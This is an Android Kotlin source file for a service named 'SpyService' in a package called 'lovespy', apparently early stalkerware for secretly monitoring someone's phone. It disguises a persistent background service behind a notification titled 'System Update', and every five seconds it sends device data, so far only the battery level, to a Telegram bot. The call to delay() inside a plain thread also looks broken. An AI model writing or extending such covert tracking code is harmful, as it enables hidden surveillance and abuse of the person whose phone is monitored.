package com.example.lovespy.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

class SpyService : Service() {
    private val CHANNEL_ID = "SpyServiceChannel"
    private val NOTIFICATION_ID = 1
    private var botToken = ""
    private var chatId = ""

    override fun onCreate() {
        super.onCreate()
        // 1. دریافت توکن و چت آیدی از مانیفست
        try {
            botToken = applicationInfo.metaData.getString("TELEGRAM_BOT_TOKEN") ?: ""
            chatId = applicationInfo.metaData.getString("TELEGRAM_CHAT_ID") ?: ""
        } catch (e: Exception) {
            Log.e("SpyService", "Error reading metadata", e)
        }

        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        Log.d("SpyService", "Service Created with Token: $botToken")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        launchBackgroundTasks()
        return START_STICKY
    }

    private fun launchBackgroundTasks() {
        Thread {
            while (true) {
                try {
                    delay(5000) // هر 5 ثانیه چک کن
                    sendStatusUpdate()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }.start()
    }

    private fun sendStatusUpdate() {
        if (botToken.isEmpty() || chatId.isEmpty()) return
        
        // یک پیام ساده برای تست
        val message = "Device is alive! Battery: ${getBatteryLevel()}%"
        sendMessageToTelegram(message)
    }

    private fun getBatteryLevel(): Int {
        val intent = applicationContext.registerReceiver(null, 
            android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level == -1 || scale == -1) -1 else ((level * 100.toLong()) / scale.toInt()).toInt()
    }

    private fun sendMessageToTelegram(text: String) {
        val url = URL("https://api.telegram.org/bot$botToken/sendMessage")
        val connection = url.openConnection() as HttpURLConnection
        connection.requestMethod = "POST"
        connection.setRequestProperty("Content-Type", "application/json; utf-8")
        connection.doOutput = true
        
        val jsonInputString = """{"chat_id": "$chatId", "text": "$text"}"""
        connection.outputStream.write(jsonInputString.toByteArray())

        val responseCode = connection.responseCode
        if (responseCode == HttpURLConnection.HTTP_OK) {
            Log.d("SpyService", "Message sent successfully")
        } else {
            Log.e("SpyService", "Failed to send message. Code: $responseCode")
        }
        connection.disconnect()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Spy Service", NotificationManager.IMPORTANCE_LOW).apply {
                description = "Running in background"
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val builder = Notification.Builder(this, CHANNEL_ID)
        builder.setContentTitle("System Update")
        builder.setContentText("Running quietly...")
        builder.setSmallIcon(android.R.drawable.ic_menu_compass)
        return builder.build()
    }

    override fun onBind(p0: Intent?): IBinder? {
        return null
    }
}
